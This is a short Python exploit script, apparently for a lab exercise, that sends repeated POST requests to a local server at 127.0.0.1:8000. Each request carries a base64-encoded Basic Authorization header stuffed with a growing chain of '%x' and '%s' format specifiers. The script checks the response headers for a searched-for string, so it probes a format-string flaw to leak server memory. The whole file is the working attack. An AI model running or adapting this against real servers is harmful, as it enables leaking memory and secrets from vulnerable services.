import base64
import requests
import json
 
#run script attack2.py giving the base64 string as the authorization headerimport requests
response=[]
i=0
start="%x   -   %s"
search=input("Enter what you want to find: ")
while  i<1000:

    b = base64.b64encode(bytes(start, 'utf-8')) # bytes
    base64_str = b.decode('utf-8') # convert bytes to string
    url = 'http://127.0.0.1:8000/'
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Basic '+base64_str

    }
    data = {
        'test': 'example'
    }
    #maximum wait time is 1 second
    try:
        response = requests.post(url, headers=headers, data=data, timeout=1)
    except requests.exceptions.Timeout:
        print("Timeout occurred")
        start="%x"+start
        continue

    if(str(response.headers).find(search)!=-1):
        print("found on attempt: "+ str(i))
        print("base64 data: "+base64_str)
        print("\ndecrypted: "+start)
        break
    i+=1
    start="%x"+start

   
